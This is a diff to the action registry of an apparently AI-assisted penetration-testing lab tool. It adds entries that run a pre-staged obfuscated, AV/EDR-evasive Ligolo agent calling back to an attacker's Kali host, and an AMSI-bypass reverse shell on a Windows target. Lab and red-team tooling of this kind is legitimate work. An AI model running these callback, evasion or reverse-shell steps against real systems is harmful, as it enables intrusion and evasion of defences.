@@ -43,6 +43,19 @@ ACTION_REGISTRY: dict[str, Action] = {
         ["yhwach enum --lab $LAB --target $IP  # delegated nmap+ingest via HexStrike"],
         runnable=False, note="Bootstrap: scan + ingest the scope via HexStrike, then probe/plan."),
 
+    # --- pivot / post-foothold: pre-staged operator tooling (~/osai/current/tools) ---
+    "deploy_ligolo_agent_win": _a("deploy_ligolo_agent_win",
+        ["# On the Windows pivot ($IP): run the pre-staged obfuscated Ligolo agent",
+         "~/osai/current/tools/svcmon.exe -connect <KALI-IP>:$LPORT -ignore-cert"],
+        risk="propose", runnable=False,
+        note="Pre-staged obfuscated Windows Ligolo agent (svcmon.exe), AV/EDR-evasive. "
+             "Listener port is in ~/osai/current/tools/ instructions — don't guess it."),
+    "drop_amsi_revshell_win": _a("drop_amsi_revshell_win",
+        ["# On the Windows target ($IP): run the pre-staged AMSI-bypass reverse shell",
+         "~/osai/current/tools/svc.exe   # or svc.bin; callback port per tools/ instructions"],
+        risk="propose", runnable=False,
+        note="Pre-staged custom AMSI-bypass reverse shell (svc.exe / svc.bin)."),
+
     # --- AI: ollama / openai-compat ---
     "probe_ollama_models": _a("probe_ollama_models",
         ["curl -sk $URL/api/tags"], outputs="http"),
